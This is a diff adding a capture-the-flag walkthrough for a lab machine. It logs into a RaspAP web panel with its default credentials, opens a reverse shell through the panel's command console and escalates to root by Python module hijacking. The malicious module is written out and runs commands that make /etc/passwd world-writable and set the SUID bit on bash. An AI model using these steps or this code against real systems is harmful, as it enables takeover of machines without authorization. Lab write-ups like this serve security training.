@@ -59,3 +59,81 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 Now we know what services are running on those port, first let's enumerate port 8091.
 
+![image](https://user-images.githubusercontent.com/87468669/211068286-f4c48163-5beb-44c1-9f1c-8b2f7ff9e7fd.png)
+ 
+it it asking us to login, let's use curl to check what's running on this websevice.
+
+![image](https://user-images.githubusercontent.com/87468669/211068936-1583b72b-108f-4551-a5a9-f117f9b8ee73.png)
+
+Looks like it is running a service name `RaspAP`, let's search online for default creds.
+
+![image](https://user-images.githubusercontent.com/87468669/211069199-f02b1e3e-513d-4c4c-9bbf-4244fa454a36.png)
+
+Found a default cred `admin:secret`
+
+![image](https://user-images.githubusercontent.com/87468669/211069345-88932bbc-b738-4130-a6e4-a88c373bc07d.png)
+
+Bull's eye 🤓, we logged in. let's play around.
+
+![image](https://user-images.githubusercontent.com/87468669/211069579-be40def2-801c-4403-990e-5cfe6878ebe6.png)
+
+Found a web console that excutes commands, guess that's our way in, let's get a reverse shell. 
+
+![image](https://user-images.githubusercontent.com/87468669/211069906-8cb6c95b-ea8e-4feb-8ac9-9537df762b90.png)
+
+ncat listener ready👀...
+
+![image](https://user-images.githubusercontent.com/87468669/211070134-1adc8ba4-2bb6-4bd0-a58d-fa5634a55ec7.png)
+
+reverse shell payload sent.
+
+![image](https://user-images.githubusercontent.com/87468669/211070307-d8a506aa-a9f7-40d0-a4b5-7cd09f866dc2.png)
+
+And we got a reverse shell. let's escalate privs.
+
+```
+www-data@walla:/var/www/html/includes$ sudo -l
+Matching Defaults entries for www-data on walla:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on walla:
+    (ALL) NOPASSWD: /sbin/ifup
+    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
+    (ALL) NOPASSWD: /bin/systemctl start hostapd.service
+    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
+    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
+    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
+    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service
+www-data@walla:/var/www/html/includes$
+```
+
+I checked for suid, there was not any, so i did `sudo -l` and so the commands we can run as root without passowrd.
+
+![image](https://user-images.githubusercontent.com/87468669/211071666-b71d424e-66a0-4aa1-85ce-1a28127ee507.png)
+
+running th command `sudo /usr/bin/python /home/walter/wifi_reset.py` got an error stating a module is not found, let's create a malicious python module named wificontroller.py... this vuln is called python module hijacking.
+
+```
+import os
+ 
+def stop(text,value):
+        os.system("chmod 777 /etc/passwd");
+ 
+def reset(text,value):
+        os.system("chmod +s /bin/bash");
+ 
+def start(text,value):
+        os.system("chmod +s /bin/python");
+```
+
+crafted a malicious python module, saved it as wificontroller.py. What this code those is to create an suid binary so we can abuse and get root or write to the /etc/passwd file.
+
+![image](https://user-images.githubusercontent.com/87468669/211074260-3f6329b4-9576-450b-b380-cfbc0e837b1c.png)
+
+ran the command again, and we have multiple ways to root. but i'm choosing the bash suid.
+
+![image](https://user-images.githubusercontent.com/87468669/211074596-9f29528c-0694-49fd-abef-a368ce9337cc.png)
+
+We got root!!!🤠
+
+
